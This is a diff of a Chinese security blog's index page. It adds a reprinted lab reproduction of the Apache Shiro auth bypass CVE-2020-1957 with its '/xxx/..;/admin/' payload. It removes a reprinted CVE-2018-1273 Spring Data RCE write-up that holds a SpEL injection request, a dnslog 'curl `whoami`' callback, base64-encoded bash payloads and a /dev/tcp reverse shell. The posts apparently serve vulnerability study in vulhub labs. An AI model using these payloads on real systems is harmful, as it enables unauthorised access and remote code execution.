@@ -86,6 +86,69 @@
 
     
         <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-1957-Apache-Shiro/">
+                Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-shiro-认证绕过漏洞-cve-2020-1957-漏洞复现">Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/119105197">Senimo_</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>CVE-2020-1957，Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><h3><span id="环境搭建">环境搭建</span></h3><blockquote>
+<p>执行如下命令启动一个搭载Spring 2.2.2与Shiro 1.5.1的应用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/shiro/CVE-2020-1957</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>环境启动后，访问<code>http://x.x.x.x:8080</code>即可查看首页:</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/1.png" alt="image"></p>
+<p>这个应用中对URL权限的配置如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ShiroFilterChainDefinition <span class="title function_">shiroFilterChainDefinition</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">DefaultShiroFilterChainDefinition</span> <span class="variable">chainDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultShiroFilterChainDefinition</span>();</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/login.html&quot;</span>, <span class="string">&quot;authc&quot;</span>); <span class="comment">// need to accept POSTs from the login form</span></span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/logout&quot;</span>, <span class="string">&quot;logout&quot;</span>);</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> chainDefinition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="漏洞复现">漏洞复现</span></h3><blockquote>
+<p>使用BurpSuite抓取数据包，访问<code>/admin/</code>目录：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/2.png" alt="image"></p>
+<p>回显<code>302</code>并跳转到登录页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/3.png" alt="image"></p>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/4.png" alt="image"></p>
+<p>URL请求过程：</p>
+<ul>
+<li>客户端请求URL: <code>/xxx/..;/admin/</code></li>
+<li>Shrio 内部处理得到校验URL为 <code>/xxxx/..</code>,校验通过</li>
+<li>SpringBoot 处理 <code>/xxx/..;/admin/</code> , 最终请求 <code>/admin/</code>, 成功访问了后台请求。</li>
+</ul>
+</blockquote>
+<h2><span id="漏洞poc">漏洞POC</span></h2><blockquote>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.safedog.cn/news.html?id=4441">https://www.safedog.cn/news.html?id=4441</a><br><a target="_blank" rel="noopener" href="https://blog.spoock.com/2020/05/09/cve-2020-1957/">https://blog.spoock.com/2020/05/09/cve-2020-1957/</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/12/06/CVE-2020-13945-Apache-APISIX/">
                 Apache APISIX 默认密钥漏洞（CVE-2020-13945）
             </a>
@@ -728,65 +791,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SOME/" rel="tag">SOME</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/CVE-2018-1273-Spring-Data/">
-                Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）漏洞验证与getshell
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="spring-data-commons-远程命令执行漏洞cve-2018-1273漏洞验证与getshell">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）漏洞验证与getshell</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45300786/article/details/119323425">樱浅沐冰</a> 并作补充</p>
-</blockquote>
-<h2><span id="影响版本">影响版本</span></h2><blockquote>
-<p>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)<br>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)<br>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)<br>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
-</blockquote>
-<h2><span id="复现过程">复现过程</span></h2><blockquote>
-<p>vulhub<br>详细过程请看<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111413971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162786362316780269821706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=162786362316780269821706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-111413971.pc_v2_rank_blog_default&utm_term=CVE-2018-1273&spm=1018.2226.3001.4450">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a></p>
-</blockquote>
-<h3><span id="一-验证">一、验证</span></h3><blockquote>
-<p>这里使用dnslog来验证。<br>先获取一个dns地址<br>t15gcx.dnslog.cn<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/1.png" alt="image"> </p>
-<p>拼接命令<br><code>curl </code>whoami<code>.t15gcx.dnslog.cn</code></p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a><br>对反弹shell的POC进行base64编码（java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符）<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/2.png" alt="image"> </p>
-<p><code>bash -c &#123;echo,Y3VybCBgd2hvYW1pYC50MTVnY3guZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
-</blockquote>
-<h3><span id="exp">Exp</span></h3><blockquote>
-<p>替换对应的payload，重新发送数据包<br>成功反弹回显到dnslog上<br><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC50MTVnY3guZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=&amp;password=&amp;repeatedPassword=</code></p>
-<p><img src="/2023/10/25/CVE-2018-1273-Spring-Data/3.png" alt="image"> </p>
-</blockquote>
-<h3><span id="二-反弹shell">二、反弹shell</span></h3><blockquote>
-<p>反弹shell<br><code>bash -i &gt;&amp; /dev/tcp/192.168.100.23/9090 0&gt;&amp;1</code></p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a><br>对反弹shell的POC进行base64编码（java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符）<br><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4yMy85MDkwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br>监听9090端口<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/4.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>替换掉curlwhoami.t15gcx.dnslog.cn对应的payload，重新发送数据包<br>成功反弹shell<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/5.png" alt="image"> </p>
-</blockquote>
-<h2><span id="参考文章">参考文章</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111413971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162786362316780269821706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=162786362316780269821706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-111413971.pc_v2_rank_blog_default&utm_term=CVE-2018-1273&spm=1018.2226.3001.4450">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2018-1273">Vulhub CVE-2018-1273</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
             </div>
         
 
